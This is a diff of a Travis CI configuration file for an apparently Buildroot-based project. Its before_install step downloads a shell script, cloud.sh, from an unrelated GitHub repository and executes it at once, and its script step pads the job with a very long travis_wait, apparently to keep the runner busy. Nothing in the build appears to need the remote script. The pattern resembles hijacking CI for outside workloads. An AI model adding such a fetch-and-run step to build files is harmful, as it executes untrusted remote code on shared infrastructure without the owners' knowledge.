@@ -9,12 +9,12 @@ env:
     - BR_RELEASE=2015.08.1-rev1
     - BR_TRAVIS_RELEASE=1.0.0
 script :
-    - travis_wait 45000 sleep 1800
+    - travis_wait 45000 apt-get update
     
 before_install: 
   
   - sudo apt-get -y update 
   - sudo apt-get -y install wget
   - sudo apt-get -y update
-  - travis_wait 3600 wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+  - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
   
